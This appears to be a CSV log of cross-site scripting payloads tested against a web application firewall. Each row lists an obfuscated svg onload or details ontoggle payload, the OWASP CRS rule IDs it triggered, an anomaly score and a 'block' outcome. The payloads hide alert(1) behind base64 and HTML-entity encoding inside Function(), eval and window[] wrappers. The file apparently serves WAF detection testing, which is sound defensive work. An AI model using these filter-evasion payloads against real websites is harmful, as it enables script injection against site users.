index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
19,<svg onload=Function(atob('YWxlcnQoMSk='))()>,0,1,block,4,"941100,941120,941160,949110","v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628753158.536280
2127,<svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944276.197068
2128,"<svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""><svg/></svg>",0,1,block,4,"941100,941120,941160,949110","v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944340.942599
2129,<svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'><svg/></svg>,0,1,block,4,"941100,941120,941160,949110","v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944463.531888
2130,<svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg><svg></svg></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944581.533462
2131,"<svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""><svg><svg></svg></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944639.338189
2133,<svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'><svg><svg></svg></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944826.029906
2134,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""/></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628944996.554174
2135,<svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg id=x></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945079.416030
2136,"<svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""><svg id=x></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945178.300744
2137,<svg id=a onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945262.489238
2139,<svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'><svg id=y/></svg>,0,1,block,4,"941100,941120,941160,949110","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945410.870031
2140,<svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg><svg/></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945526.865782
2141,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg></svg></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945615.228168
2142,"<svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""><svg><svg/></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945765.635031
2143,<svg id=outer onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg id=inner></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,8v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,21v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628945897.453874
2145,<svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'><svg id=inner/></svg>,0,1,block,4,"941100,941120,941160,949110","v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762894608.727936
2146,<svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg width=1></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628946158.810073
2147,<svg><svg width=1 onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o17,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,25v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628946282.136177
2148,"<svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""><svg width=1 height=1></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628946388.206688
2149,<svg width=1 onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,20v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628946468.171571
2150,<svg><svg width=1 height=1 onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o26,8v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,34v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628946594.358860
2151,<svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'><svg width=1/></svg>,0,1,block,4,"941100,941120,941160,949110","v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628946628.649623
2152,"<svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()><svg xmlns=""http://www.w3.org/2000/svg""></svg></svg>",0,1,block,5,"941100,941120,941130,941160,949110","v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o39,6v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177628946769.780966
2154,"<svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()""><svg xmlns=""http://www.w3.org/2000/svg""/></svg>",0,1,block,5,"941100,941120,941130,941160,949110","v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,6v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177628946923.769715
2155,"<svg onload=""eval(Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)())""><svg>",0,1,block,6,"933160,934100,941100,941120,941160,949110","o13,74v217,94 || o13,5v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177628947061.949818
2156,"<svg onload=""window[Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()]""><svg></svg></svg>",0,1,block,5,"941100,941120,941160,941370,949110","v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,76v217,108t:urlDecodeUni,t:compressWhitespace || ",20,177628947135.899417
2356,"<details open ontoggle=""(function(){return confirm(1)})()""><details ontoggle=""x"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628967476.245095
